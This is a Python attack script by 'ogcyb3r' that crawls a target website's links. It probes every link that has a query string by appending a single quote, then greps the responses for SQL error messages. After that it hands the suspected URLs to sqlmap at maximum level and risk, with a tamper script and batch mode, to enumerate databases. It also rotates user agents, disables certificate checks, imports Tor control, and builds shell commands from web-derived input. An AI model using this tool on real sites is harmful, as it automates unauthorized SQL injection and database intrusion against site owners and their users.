#!/usr/bin/env python3.5
# coded by ogcyb3r
# to change DBgethref database to another,
# check line:183 search for 'DBgethref'
import requests
from requests.exceptions import Timeout
import sys
import socket
import click
from urllib.parse import urlparse
import http.client
import subprocess
import os
import time
import string
import urllib3
urllib3.disable_warnings()
import jinja2
#import html
import random
import re
from datetime import datetime
#from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller
from bs4 import BeautifulSoup as BS
def createSQL2(o1,o2,o3,o4,o5,o6): #saving as .sql
    DIUU = ''.join([random.choice(string.digits) for n in range(10)])
    todays = datetime.today()
    created = todays.strftime("%d/%m/%Y %H:%M%p")
    o1 = jinja2.escape(o1)
    o2 = jinja2.escape(o2)
    o3 = jinja2.escape(o3)
    o4 = jinja2.escape(o4)
    o5 = jinja2.escape(o5)
    o6 = jinja2.escape(o6)
    return("""INSERT INTO `0xfindurl` (`uid`, `target`, `ip`, `links`, `header`, `whoisip`, `sublinks`, `created`) VALUES ("%s", "%s", "%s", "%s", "%s", "%s", "%s", "%s");\n"""%(DIUU,o1,o2,o3,o4,o5,o6,created))
def d1():
    today = datetime.today()
    d1 = today.strftime(" %d/%m/%Y %H:%M%p")
    return(d1)
today = datetime.today()
todaystrftime = today.strftime("%d-%m-%Y-%H%m%p")
fiveRandom = ''.join([random.choice(string.digits) for n in range(3)])
mixRandom = todaystrftime + '-' + fiveRandom
def clearme():
    cce = 'clear'
    os.system(cce)
clearme()
#\x1b[30;38;5;145m[\x1b[1;38;5;196m x \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[30;38;5;197m Tor (NOT FIXED YET).\x1b[0m
#\x1b[1;37m❖\x1b[0m \x1b[30;38;5;59m start digging the source code as False SSL Cert...#line:103
def header():
    print(("""\x1b[30;38;5;145m[\x1b[1;38;5;222m Title \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[1;38;5;111m Read source code of href : <a href=\x1b[1;38;5;226m"X"\x1b[30;38;5;111m>.</a>\x1b[0m
                 \x1b[0;33m\x1b[0m\x1b[1;32m\x1b[30;38;5;59mــــــ\x1b[1;37m❖\x1b[0mــــــ\x1b[0m
\x1b[1;38;5;110m
                ▄▖▄▖    ▌ ▄▖
                ▌▌▌ ▛▘▌▌▛▌▄▌▛▘
                ▙▌▙▌▙▖▙▌▙▌▄▌▌
                      ▄▌
\x1b[0m▁ ▂ ▃ ▄ ▅ ▆ ▇\x1b[1;48;5;233m╿\x1b[0m█\x1b[1;48;5;233m╿\x1b[0m▉\x1b[1;48;5;233m╿\x1b[0m▊\x1b[1;48;5;233m╿\x1b[0m▋\x1b[1;48;5;233m╿\x1b[0m\x1b[1;48;5;197m卍\x1b[0m\x1b[1;48;5;233m╿\x1b[0m▋\x1b[1;48;5;233m╿\x1b[0m▊\x1b[1;48;5;233m╿\x1b[0m▉\x1b[1;48;5;233m╿\x1b[0m█\x1b[1;48;5;233m╿\x1b[0m▇ ▆ ▅ ▄ ▃ ▂ ▁
\x1b[30;38;5;235m▁▁▁▇▇▁▁▁▁▁ ▇▇▇▇▇▇▇▇▇▇▇▇ ▇▇▇▇▇▇▇▇▇▇▇▇ ▁▁▁▁▁▇▇▁▁▁\x1b[0m
\x1b[30;38;5;145m[\x1b[1;38;5;119m ✔ \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[1;38;5;119m Database saved\x1b[0m
\x1b[30;38;5;145m[\x1b[1;38;5;119m ✔ \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[1;38;5;119m https/http allowed.\x1b[0m
\x1b[1;38;5;255mHow to use :\x1b[0m
\x1b[30;38;5;145m[\x1b[1;38;5;139m "\x1b[30;38;5;119m^.\x1b[0m\x1b[1;38;5;189m" \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[30;38;5;111m searching any string on target\x1b[0m
\x1b[30;38;5;145m[\x1b[1;38;5;139m "\x1b[30;38;5;119mphp\x1b[0m\x1b[1;38;5;189m" \x1b[0m\x1b[30;38;5;145m]\x1b[0m - \x1b[30;38;5;145m[\x1b[1;38;5;139m "\x1b[30;38;5;119maspx\x1b[0m\x1b[1;38;5;189m" \x1b[0m\x1b[30;38;5;145m]\x1b[0m - \x1b[30;38;5;145m[\x1b[1;38;5;139m "\x1b[30;38;5;119mlogin\x1b[0m\x1b[1;38;5;189m" \x1b[0m\x1b[30;38;5;145m]\x1b[0m - \x1b[30;38;5;145m[\x1b[1;38;5;139m "\x1b[30;38;5;119m=\x1b[0m\x1b[1;38;5;189m" \x1b[0m\x1b[30;38;5;145m]\x1b[0m

    \x1b[30;38;5;189m%s https://site.com "\x1b[30;38;5;119m^.\x1b[0m\x1b[1;38;5;189m"\x1b[0m
""" %(sys.argv[0])))
def startHeader(input_target, input_options, po):
    today = datetime.today()
    d2x = today.strftime("%d%m%Y:%H%M")
    print(("""\x1b[1;48;5;255m▋▋\x1b[0m
\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[30;38;5;35m+\x1b[0m⟞| Target \x1b[30;38;5;87m%s\x1b[0m
\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[30;38;5;35m+\x1b[0m⟞| Option \x1b[30;38;5;243m%s\x1b[0m
\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[30;38;5;35m+\x1b[0m⟞| Saving to \x1b[30;38;5;243m%s\x1b[0m
\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[30;38;5;35m+\x1b[0m⟞| Start on \x1b[30;38;5;243m%s\x1b[0m
\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[30;38;5;35m+\x1b[0m⟞| bypass ssl \x1b[30;38;5;65mFalse (line:120-130)\x1b[0m
""" %(input_target, input_options, po+'/'+mixRandom, d1())))
def main():
    if len(sys.argv) == 1:
        header()
        sys.exit(0)
    if len(sys.argv) > 2:
        input_target = sys.argv[1]
        if not 'http' in input_target:
            input_target = 'https://'+input_target
        input_options = sys.argv[2]
        getURL2(input_target,input_options)
    else:
        input_target = sys.argv[1]
        if not 'http' in input_target:
            input_target = 'https://'+input_target
        input_options = ''
        getURL2(input_target,input_options)
def getURL2(input_target,input_options):
    randomuid = ''.join([random.choice(string.digits) for n in range(10)])
    user_agent_list = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:74.0) Gecko/20100101 Firefox/73.9',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:74.0) Gecko/20100101 Firefox/74.0'
]
    user_agent = random.choice(user_agent_list)
    header = {'User-Agent': user_agent}
    r = requests.get(input_target, timeout=3, headers=header, verify=False, allow_redirects=True)
    ReMoveAllHttpWwww = input_target
    url = re.compile(r"https?://(www\.)?")
    pure_target = url.sub('', ReMoveAllHttpWwww).strip().strip('/')
    po = 'gethref_output/'+pure_target+'/'+mixRandom
    if not os.path.exists(po):
        os.makedirs(po, exist_ok=True)
    startHeader(input_target, input_options, po)
    soup = BS(r.text, "html5lib")
    xpx = soup.find_all('a', attrs={'href': re.compile(input_options)})
    try:
        for link in soup.find_all('a', attrs={'href': re.compile(input_options)}):
            href_links = link.get('href')
            if not 'http' in href_links:
                href_links = input_target+'/'+href_links
            if re.match('^/', href_links):
                href_links = input_target+href_links
            elif re.match('^#', href_links):
                href_links = ''
                pass
            elif re.match('^JavaScript:void(0);', href_links):
                pass
            else:
                href_links = href_links
            checkphp = re.findall(r'[\w\.-?]+[\w\.-=]+', href_links)
            parsed_uri = urlparse(href_links)
            result_requests = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
            result_links = '{uri.netloc}'.format(uri=parsed_uri)
            url2 = re.compile(r"https?://(www\.)?")
            pure_target_links = url2.sub('', result_requests).strip().strip('/')
            host_ip = socket.gethostbyname(pure_target_links)
            Who_Has_website_from_Ip=("getent hosts %s" %host_ip)
            Print_the_ip_and_website =  subprocess.Popen(Who_Has_website_from_Ip, shell=True, stdout=subprocess.PIPE).stdout
            Print_the_ip_and_website =  Print_the_ip_and_website.read()
            user_agent_list = [
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:74.0) Gecko/20100101 Firefox/73.9',
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:74.0) Gecko/20100101 Firefox/74.0'
        ]
            user_agent = random.choice(user_agent_list)
            header = {'User-Agent': user_agent}
            r1x = requests.get(result_requests, headers=header, verify=False, allow_redirects=True)
            for site in href_links:
                if "?" in site:
                    print(("""\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[1;38;5;76m %s \x1b[0m⟞|\x1b[1;38;5;253m%s\x1b[0m """%(host_ip,href_links)))
                    payload = "'"
                    href_links2 = href_links+"'"
                    user_agent_list = [
                    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:74.0) Gecko/20100101 Firefox/73.9',
                    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:74.0) Gecko/20100101 Firefox/74.0'
                ]
                    user_agent = random.choice(user_agent_list)
                    header = {'User-Agent': user_agent}
                    r = requests.get(href_links2, headers=header, verify=False, allow_redirects=True)
                    SaveToErrors = open("gethref_output/%s/%s/checkError.txt"%(pure_target,mixRandom), "a+")
                    SaveToErrors.write("%s\n\n#########################################################\n\n%s\n\n"%(r.url,r.text))
                    SaveToErrors.close()
                    SaveToSQLMAP = open("gethref_output/%s/%s/sqlmap.txt"%(pure_target,mixRandom), "a+")
                    SaveToSQLMAP.write("%s\n"%(href_links))
                    SaveToSQLMAP.close()
                else:
                    pass
            print(("""\x1b[1;48;5;255m▋\x1b[0m|⟝\x1b[30;38;5;239m %s \x1b[0m⟞|\x1b[30;38;5;245m%s\x1b[0m """%(host_ip,href_links)))
            SaveTolinks = open("gethref_output/%s/%s/links.txt"%(pure_target,mixRandom), "a+")
            SaveToBlow = open("gethref_output/%s/%s/blow.txt"%(pure_target,mixRandom), "a+")
            SaveToMYSQL = open("gethref_output/%s/%s/sql.sql"%(pure_target,mixRandom), "a+")
            SaveTolinks.write("%s\n"%(href_links))
            SaveToBlow.write("#Target: %s\n#Ip: %s\n#Links: %s\n#Header: %s\n\n-----------------------\n\n"%(pure_target,Print_the_ip_and_website,href_links,r1x.headers))
            SaveToMYSQL.write(createSQL2(pure_target,host_ip,href_links,r1x.headers,Print_the_ip_and_website,pure_target_links))
            SaveTolinks.close()
            SaveToBlow.close()
            SaveToMYSQL.close()

    finally:
        whatwasthat = "gethref_output/%s/%s/checkError.txt"%(pure_target,mixRandom)
        if click.confirm("\n\n[\x1b[30;38;5;195m mysql option \x1b[0m] \x1b[1;38;5;110mDo you want to insert it now ?\x1b[0m", default=True):
            letInsert = "gethref_output/%s/%s/sql.sql"%(pure_target,mixRandom)
            Gusername = input("[\x1b[1;38;5;195m 1 \x1b[0m] \x1b[1;38;5;109mType MySQL \x1b[1;38;5;174mUsername\x1b[0m or hit enter default='root' ? :▋_ ") or "root" #  root , USER
            Gpassword = input("[\x1b[1;38;5;195m 2 \x1b[0m] \x1b[1;38;5;109mType MySQL \x1b[1;38;5;175mPassword\x1b[0m or hit enter default='toor' ? :▋_ ") or "food" #  toor , password
            Gdatabase = input("[\x1b[1;38;5;195m 3 \x1b[0m] \x1b[1;38;5;110mType MySQL \x1b[1;38;5;177mDatabase\x1b[0m or hit enter default='DBgethref' ? :▋_ ") or "DBgethref" # DBgetherf
            G1 = "mysql -u "+Gusername
            G2 = " -p"+Gpassword
            G3 = " -D "+Gdatabase
            G4 = G1+G2+G3+" < "+letInsert
            os.system(G4)
            EE=("%s" %G4)
            DD =  subprocess.Popen(EE, shell=True, stdout=subprocess.PIPE).stdout
            DD =  DD.read()
            print(("""
\x1b[1;48;5;119m▋\x1b[0m[\x1b[1;38;5;119m ✔ \x1b[0m] \x1b[1;38;5;253m Done insert [\x1b[1;38;5;226msql.sql\x1b[1;38;5;253m] \x1b[0m

        """))
        if os.path.isfile(whatwasthat):
            GotSQLi = "grep -r -E \"Input string was not|Error|to use near|error|MySQL|MYSQL|syntax\" %s | wc -l " %whatwasthat
            GotSQLi=("%s" %GotSQLi)
            GotSQLi =  subprocess.Popen(GotSQLi, shell=True, stdout=subprocess.PIPE).stdout
            GotSQLi =  GotSQLi.read()
            if GotSQLi:
                typeThis = "grep -r -E \"Input string was not|Error|to use near|error|MySQL|MYSQL|syntax\" %s"%(whatwasthat)
                res = [int(i) for i in GotSQLi.split() if i.isdigit()]
                print(("""
\x1b[1;48;5;119m▋\x1b[0m[\x1b[1;38;5;119m + \x1b[0m] \x1b[1;38;5;229m Totle of Errors Found : [\x1b[1;38;5;116m %s \x1b[1;38;5;229m] \x1b[0m
\x1b[30;38;5;238m%s \x1b[0m
                """%(str(res),typeThis)))
            else:
                print(("""
                Nothing found.
                """))
            if click.confirm('Do you want to continue using sqlmap to inject the links? and checking terminal as well to see if there is any errors?', default=True):
                whereSQL = "gethref_output/%s/%s/sqlmap.txt"%(pure_target,mixRandom)
                os.system("gnome-terminal -e 'bash -c \"sqlmap -m %s --dbs -v 3 --random-agent --level 5 --risk 3 --tamper=between --batch; exec bash\"'"%(whereSQL))
                sys.exit(0)
            else:
                sys.exit(0)
        else:
            sys.exit(0)



if __name__ == '__main__':
    main()
